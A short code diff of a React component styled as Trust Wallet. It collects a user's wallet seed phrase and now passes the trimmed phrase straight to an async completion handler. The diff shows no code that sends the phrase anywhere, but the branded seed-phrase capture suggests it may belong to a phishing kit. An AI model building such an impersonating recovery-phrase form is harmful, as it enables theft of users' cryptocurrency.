@@ -8,10 +8,8 @@ import TrustWalletFull from "../icons/trust-wallet-full";
 
 const TrustWallet = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [walletName, setWalletName] = useState("Main wallet");
 	const [seedPhrase, setSeedPhraseState] = useState("");
@@ -23,8 +21,7 @@ const TrustWallet = ({
 	// Handle completion
 	const handleComplete = () => {
 		setSeedPhrase(seedPhrase.trim());
-		setWalletPhrase(seedPhrase.trim());
-		handleFinish();
+		handleFinish(seedPhrase.trim());
 	};
 
 	// Handle click area focus
